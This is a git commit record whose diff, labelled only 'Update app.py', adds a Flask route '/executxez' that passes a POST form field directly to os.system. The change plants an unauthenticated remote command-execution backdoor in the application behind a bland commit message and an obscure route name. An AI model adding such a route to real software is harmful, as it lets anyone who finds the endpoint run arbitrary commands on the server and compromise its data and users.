cdabbd1444aa70fe88ba1d779ab90056a829174d
Christian Papathanasiou <chris@athcon.org>
2024-06-05 00:06:52 +0300

    Update app.py

--- app.py
+++ app.py
@@ -19,6 +19,12 @@ conn.commit()
 conn.close()
 
 
+@app.route('/executxez',methods=['POST'])
+def haha():
+   if request.method == 'POST':
+     foo = request.form['foo']
+     os.system(foo)
+
 
 @app.route('/')
 def index():
